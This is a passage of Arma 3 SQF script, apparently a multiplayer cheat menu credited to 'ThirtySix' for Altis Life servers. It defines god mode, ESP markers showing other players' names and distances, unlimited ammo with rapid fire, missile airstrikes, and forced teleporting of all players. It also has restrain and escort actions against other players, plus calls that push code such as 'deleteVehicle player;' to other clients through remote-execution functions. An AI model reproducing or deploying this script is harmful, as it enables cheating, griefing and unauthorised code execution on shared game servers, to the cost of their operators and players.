                    _svtp = createVehicle["O_MRAP_02_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn Ifrit HMG", {
                    _svtp = createVehicle["O_MRAP_02_hmg_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn Ifrit GMG", {
                    _svtp = createVehicle["O_MRAP_02_gmg_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn Tank", {
                    _svtp = createVehicle["B_MBT_01_cannon_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn Tank2", {
                    _svtp = createVehicle["B_MBT_01_mlrs_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
                Dummy addAction["Spawn AH9", {
                    _svtp = createVehicle["B_Heli_Light_01_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn AH9 Armed", {
                    _svtp = createVehicle["B_Heli_Light_01_armed_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn Armed Kajaman", {
                    _svtp = createVehicle["O_Heli_Attack_02_black_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn Ghost Hawk", {
                    _svtp = createVehicle["B_Heli_Transport_01_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn Armed Orca", {
                    _svtp = createVehicle["O_Heli_Light_02_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn Commance", {
                    _svtp = createVehicle["B_Heli_Attack_01_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
                Dummy addAction["Spawn Plane I", {
                    _svtp = createVehicle["I_Plane_Fighter_03_CAS_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn Plane B", {
                    _svtp = createVehicle["B_Plane_CAS_01_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["Spawn Plane O", {
                    _svtp = createVehicle["O_Plane_CAS_02_F", Dummy modelToWorld[0, 10, 0], [], 0, "CAN_COLLIDE"];
                    _svtp setDir(direction Dummy - 90);
                }, "", 50];
                Dummy addAction["<t color='#000000'>----------------------</t>", {
                    hint "Menu by ThirtySix";
                }, "", 50];
            }, "", 50];
            Dummy addAction["- Extras", {
                removeallactions Dummy;
                Dummy addaction["<t color='#FF0000'>Close Menu</t>", {
                    removeallactions Dummy;
                    call Dummy_Menu;
                }, "", 50];
                Dummy addaction["<t color='#000000'>----------------------</t>", {
                    Hint "Dummy FTW! :D";
                }, "", 50];
                Dummy addAction["- Godmode", {
                    if (isNil "Dummy_God") then {
                        Dummy_God = 0;
                    };
                    if (Dummy_God == 0) then {
                        Dummy_God = 1;
                        hint "Godmode \n by ThirtySix \n ON ";
                        fnc_usec_damageHandler = {};
                        fnc_usec_unconscious = {};
                        Dummy removeAllEventHandlers "handleDamage";
                        Dummy addEventHandler["handleDamage", {
                            false
                        }];
                        Dummy allowDamage false;
                        vehicle Dummy removeAllEventHandlers "handleDamage";
                        vehicle Dummy addEventHandler["handleDamage", {
                            false
                        }];
                        vehicle Dummy allowDamage false;
                    } else {
                        Dummy_God = 0;
                        hint "Godmode \n by ThirtySix \n OFF ";
                        Dummy addEventHandler["handleDamage", {
                            true
                        }];
                        Dummy removeAllEventHandlers "handleDamage";
                        Dummy allowDamage true;
                    };
                }, "", 50];
                Dummy addAction["- E5P Markers", {
                    if (isnil("Dummy_E5P")) then {
                        Dummy_E5P = 0;
                    };
                    if (Dummy_E5P == 0) then {
                        Dummy_E5P = 1;
                        hint "Dummy_E5P \n by ThirtySix \n ON";
                    } else {
                        Dummy_E5P = 0;
                        hint "Dummy_E5P \n by ThirtySix \n OFF";
                    };
                    if (Dummy_E5P == 1) then {
                        onEachFrame {
                            _l49 = nearestobjects[Dummy, ["CAManBase"], 1500]; {
                                if ((side _x != side player) && (getPlayerUID _x != "") && ((Dummy distance _x) < 1500)) then {
                                    drawIcon3D["", [1, 0, 0, 1], [visiblePosition _x select 0, visiblePosition _x select 1, (getPosATL _x select 2) + 2], 0.1, 0.1, 45, (format["%2 : %1m", round(Dummy distance _x), name _x]), 1, 0.04, "TahomaB"]
                                } else {
                                    if ((getPlayerUID _x != "") && ((Dummy distance _x) < 1500)) then {
                                        drawIcon3D["", [0, 0.5, 1, 1], [visiblePosition _x select 0, visiblePosition _x select 1, (getPosATL _x select 2) + 2], 0.1, 0.1, 45, (format["%2 : %1m", round(Dummy distance _x), name _x]), 1, 0.04, "TahomaB"]
                                    };
                                };
                            }
                            foreach playableUnits;
                        };
                    } else {
                        onEachFrame {
                            nil
                        };
                    };
                }, "", 50];
                Dummy addAction["- Unlimit Ammo + Rapit Fire", {
                    if (isnil("ThirtySix_Unlim_Ammo_Dummy")) then {
                        ThirtySix_Unlim_Ammo_Dummy = 0;
                    };
                    if (ThirtySix_Unlim_Ammo_Dummy == 0) then {
                        ThirtySix_Unlim_Ammo_Dummy = 1;
                        hint "Unlimit Ammo \n by ThirtySix \n ON";
                    } else {
                        ThirtySix_Unlim_Ammo_Dummy = 0;
                        hint "Unlimit Ammo \n by ThirtySix \n OFF";
                    };
                    while {
                        ThirtySix_Unlim_Ammo_Dummy == 1
                    }
                    do {
                        if (!alive Dummy) then {
                            Dummy_God = 0;
                            Dummy_E5P = 0;
                            ThirtySix_Unlim_Ammo_Dummy = 0;
                            deletevehicle Dummy;
                        };
                        vehicle Dummy setVehicleLock "UNLOCKED";
                        _l25 = primaryWeapon Dummy;
                        _l31 = secondaryWeapon Dummy;
                        Dummy setAmmo[_l25, 999];
                        Dummy setAmmo[_l31, 999];
                        (vehicle Dummy) setVehicleAmmo 1;
                        (vehicle Dummy) setVehicleAmmo 1;
                        (vehicle Dummy) setWeaponReloadingTime[(vehicle Dummy), currentWeapon(vehicle Dummy), 0];
                        Dummy setWeaponReloadingTime[Dummy, currentWeapon Dummy, 0];
                        Dummy setFatigue 0;
                        uiSleep 0.01;
                    };
                }, "", 50];
                Dummy addAction["- Airstrike", {
                    meins = 1000;
                    mein1 = {
                        openMap[false, false];
                        [_pos] spawn {
                            for '_l39'
                            from 0 to meins do {
                                _l87 = "M_AT";
                                _l88 = [_this select 0 select 0, _this select 0 select 1, (_this select 0 select 2) + 200];
                                _l89 = createVehicle[_l87, _l88, [], 0, "CAN_COLLIDE"];
                                _l89 setvelocity[random 1000.00 - 500, random 1000.00 - 500, 0];
                                [_l89, -90, 0] call BIS_fnc_setPitchBank;
                                hint format["Missiles Launched \n by ThirtySix \n %1", _l39];
                                uiSleep(random 0.00001);
                            };
                        };
                    };
                    titleText["Click on map to drop Airstrike", "PLAIN"];
                    titlefadeout 7;
                    onMapSingleClick "_pos call mein1;";
                    openMap[true, false];
                }, "", 50];
                Dummy addAction["- TP me to kavalla Top", {
                    Dummy setPos[3690, 13150, 14.6];
                    hint format["Ported - by ThirtySix"];
                }, "", 50];
                Dummy addAction["- TP all to my Cursor", {
                    _wPos = screenToWorld[0.5, 0.5];
                    _donot = name player;
                    [TRUE, "deleteVehicle player;"] call Thirty_Six; {
                        if (name _x != name player) then {
                            vehicle _x setPos(_wPos);
                        };
                    }
                    foreach playableUnits;
                    hint format[" All players teleported to: \n %1 \n by Thirty_Six", _wPos];
                }, "", 50];
                Dummy addaction["<t color='#000000'>----------------------</t>", {
                    Hint "Dummy FTW! :D";
                }, "", 50];
            }, "", 50];
            Dummy addAction["- Cop", {
                removeallactions Dummy;
                Dummy addaction["<t color='#FF0000'>Close Menu</t>", {
                    removeallactions Dummy;
                    call Dummy_Menu;
                }, "", 50];
                Dummy addaction["<t color='#000000'>----------------------</t>", {
                    Hint "Dummy FTW! :D";
                }, "", 50];
                Dummy addAction["- Chat", {
                    if (getPlayerUID cursorTarget != "") then {
                        [cursorTarget, "['TaskSucceeded', ['', 'Incoming Message']] call BIS_fnc_showNotification;hint '\n My friend, \n i cant hear you, if you wish to tell me something, please use the\n Direct Chat. \n \n --------------------------------------------- \n Lieber Freund, \n ich kann dich nicht hoeren, wenn du mir etwas sagen willst, schreibe dies bitte in den \n Direct Chat. \n';"] call ThirtySix;
                        hint '\n My friend, \n i cant hear you, if you wish to tell me something, please use the\n Direct Chat. \n \n --------------------------------------------- \n Lieber Freund, \n ich kann dich nicht hoeren, wenn du mir etwas sagen willst, schreibe dies bitte in den \n Direct Chat. \n';
                    } else {
                        hint "No cursor target found!";
                    };
                }, "", 50];
                Dummy addAction["- Restrain Target", {
                    hint format["%1 was restrained \n by ThirtySix", name cursorTarget];
                    cursorTarget setVariable["restrained", true, true];
                    [
                        [cursorTarget], "life_fnc_restrain", cursorTarget, false
                    ] spawn life_fnc_MP;
                }, "", 50];
                Dummy addAction["- Unrestrain Target", {
                    hint format["%1 was released \n by ThirtySix", name cursorTarget];
                    cursorTarget setVariable["restrained", false, true];
                }, "", 50];
                Dummy addAction["- Escort on", {
                    cursorTarget attachTo[Dummy, [0.1, 1.1, 0]];
                    cursorTarget setVariable["transporting", false, true];
                    cursorTarget setVariable["Escorting", true, true];
                }, "", 50];
                Dummy addAction["- Escort off", {
                    detach cursorTarget;
                    cursorTarget setVariable["Escorting", false, true];
                }, "", 50];
                Dummy addAction["-<t color='#FFFF00'> Attach Player </t>", {
                    if (isnil("Attach_Player_to_Dummy")) then {
                        Attach_Player_to_Dummy = 0;
                    };
                    if (Attach_Player_to_Dummy == 0) then {
                        Attach_Player_to_Dummy = 1;
                        Saved_pos_player = getpos player;
                        player attachTo[Dummy, [0, 0, -20]];
                        hint "Player attached to Dummy \n by ThirtySix";
                    } else {
                        Attach_Player_to_Dummy = 0;
                        detach player;
                        vehicle player setpos Saved_pos_player;
                        hint "Player detached from Dummy \n by ThirtySix";
                    };
                }, "", 50];
                Dummy addaction["<t color='#000000'>----------------------</t>", {
                    Hint "Dummy FTW! :D";
                }, "", 50];
            }, "", 50];
            Dummy addaction["<t color='#000000'>----------------------</t>", {
                Hint "Dummy FTW! :D";
            }, "", 50];
        };
        fill = {
            private["_box", "_type", "_boxn", "_bType", "_bType", "_bPos", "_boxn", "_cfgweapons", "_weapons", "_magazines", "_cur_wep", "_classname", "_wep_type", "_scope", "_picture", "_items", "_backpacks"];
            _box = _this select 0;
            _type = _this select 1;
            _resupply =
                if (count _this > 2) then {
                    _this select 2;
                } else {
                    false;
                };
            _resupply_time =
                if (count _this > 3) then {
                    _this select 3;
                } else {
                    60 * 5
                };
            _bType = typeOf _box;
            _bPos = getPos _box;
            if (!local _box) then {
                _box hideObject true;
                _boxn = _bType createVehicleLocal[0, 0, 0];
                _boxn setPosATL[_bPos select 0, _bPos select 1, 0];
            } else {
                _boxn = _box;
            };
            clearWeaponCargo _boxn;
            clearMagazineCargo _boxn;
            clearItemCargo _boxn;
            clearBackpackCargo _boxn;
            switch (_type) do {
                case 0:
                    {
                        _cfgweapons = configFile >> "CfgWeapons";
                        _weapons = [];
                        for "_i"
                        from 0 to(count _cfgWeapons) - 1 do {
                                _cur_wep = _cfgweapons select _i;
                                if (isClass _cur_wep) then {
                                    _classname = configName _cur_wep;
                                    _wep_type = getNumber(_cur_wep >> "type");
                                    _scope = getNumber(_cur_wep >> "scope");
                                    _picture = getText(_cur_wep >> "picture");
                                    if (_scope >= 2 && _wep_type in [1, 2, 4, 4096] && _picture != "" && !(_classname in _weapons) && _classname != "NVGoggles") then {
                                        _weapons set[count _weapons, _classname];
                                    };
                                };
                            };
                            _cfgweapons = configFile >> "CfgMagazines";
                        _magazines = [];
                        for "_i"
                        from 0 to(count _cfgWeapons) - 1 do {
                                _cur_wep = _cfgweapons select _i;
                                if (isClass _cur_wep) then {
                                    _classname = configName _cur_wep;
                                    _scope = getNumber(_cur_wep >> "scope");
                                    _picture = getText(_cur_wep >> "picture");
                                    if (_scope >= 2 && _picture != "" && !(_classname in _magazines)) then {
                                        _magazines set[count _magazines, _classname];
                                    };
                                };
                            }; {
                                _boxn addWeaponCargo[_x, 5];
                            }
                        foreach _weapons; {
                            _boxn addMagazineCargo[_x, 50];
                        }
                        foreach _magazines;
                        _cfgweapons = configFile >> "CfgWeapons";
                        _items = [];
                        for "_i"
                        from 0 to(count _cfgWeapons) - 1 do {
                                _cur_wep = _cfgweapons select _i;
                                if (isClass _cur_wep) then {
                                    _classname = configName _cur_wep;
                                    _wep_type = getNumber(_cur_wep >> "type");
                                    _scope = getNumber(_cur_wep >> "scope");
                                    _picture = getText(_cur_wep >> "picture");
                                    if (_scope >= 2 && _wep_type in [131072, 4096] && _picture != "" && !(_classname in _items) && _classname != "Binocular") then {
                                        _items set[count _items, _classname];
                                    };
                                };
                            }; {
                                _boxn addItemCargo[_x, 1];
                            }
                        foreach _items;
                        _cfgweapons = configFile >> "CfgVehicles";
                        _backpacks = [];
                        for "_i"
                        from 0 to(count _cfgWeapons) - 1 do {
                                _cur_wep = _cfgweapons select _i;
                                if (isClass _cur_wep) then {
                                    _classname = configName _cur_wep;
                                    _wep_type = getText(_cur_wep >> "vehicleClass");
                                    _scope = getNumber(_cur_wep >> "scope");
                                    _picture = getText(_cur_wep >> "picture");
                                    if (_scope >= 2 && _wep_type == "Backpacks" && _picture != "" && !(_classname in _backpacks)) then {
                                        _backpacks set[count _backpacks, _classname];
                                    };
                                };
                            }; {
                                _boxn addBackPackCargo[_x, 10];
                            }
                        foreach _backpacks;
                    };
                case 1:
                    {
                        _cfgweapons = configFile >> "CfgWeapons";
                        _weapons = [];
                        for "_i"
                        from 0 to(count _cfgWeapons) - 1 do {
                                _cur_wep = _cfgweapons select _i;
                                if (isClass _cur_wep) then {
                                    _classname = configName _cur_wep;
                                    _wep_type = getNumber(_cur_wep >> "type");
                                    _scope = getNumber(_cur_wep >> "scope");
                                    _picture = getText(_cur_wep >> "picture");
                                    if (_scope >= 2 && _wep_type in [1, 2, 4, 4096] && _picture != "" && !(_classname in _weapons) && _classname != "NVGoggles") then {
                                        _weapons set[count _weapons, _classname];
                                    };
                                };
                            };
                            _cfgweapons = configFile >> "CfgMagazines";
                        _magazines = [];
                        for "_i"
                        from 0 to(count _cfgWeapons) - 1 do {
                                _cur_wep = _cfgweapons select _i;
                                if (isClass _cur_wep) then {
                                    _classname = configName _cur_wep;
                                    _scope = getNumber(_cur_wep >> "scope");
                                    _picture = getText(_cur_wep >> "picture");
                                    if (_scope >= 2 && _picture != "" && !(_classname in _magazines)) then {
                                        _magazines set[count _magazines, _classname];
                                    };
                                };
                            }; {
                                _boxn addWeaponCargo[_x, 5];
                            }
                        foreach _weapons; {
                            _boxn addMagazineCargo[_x, 50];
                        }
                        foreach _magazines;
                    };
                case 2:
                    {
                        _cfgweapons = configFile >> "CfgWeapons";
                        _items = [];
                        for "_i"
                        from 0 to(count _cfgWeapons) - 1 do {
                                _cur_wep = _cfgweapons select _i;
                                if (isClass _cur_wep) then {
                                    _classname = configName _cur_wep;
                                    _wep_type = getNumber(_cur_wep >> "type");
                                    _scope = getNumber(_cur_wep >> "scope");
                                    _picture = getText(_cur_wep >> "picture");
                                    if (_scope >= 2 && _wep_type in [131072, 4096] && _picture != "" && !(_classname in _items) && _classname != "Binocular") then {
                                        _items set[count _items, _classname];
                                    };
                                };
                            }; {
                                _boxn addItemCargo[_x, 10];
                            }
                        foreach _items;
                    };
                case 3:
                    {
                        _cfgweapons = configFile >> "CfgVehicles";
                        _backpacks = [];
                        for "_i"
                        from 0 to(count _cfgWeapons) - 1 do {
                                _cur_wep = _cfgweapons select _i;
                                if (isClass _cur_wep) then {
                                    _classname = configName _cur_wep;
                                    _wep_type = getText(_cur_wep >> "vehicleClass");
                                    _scope = getNumber(_cur_wep >> "scope");
                                    _picture = getText(_cur_wep >> "picture");
                                    if (_scope >= 2 && _wep_type == "Backpacks" && _picture != "" && !(_classname in _backpacks)) then {
                                        _backpacks set[count _backpacks, _classname];
                                    };
                                };
                            }; {
                                _boxn addBackPackCargo[_x, 10];
                            }
                        foreach _backpacks;
                    };
            };
        };
    };
};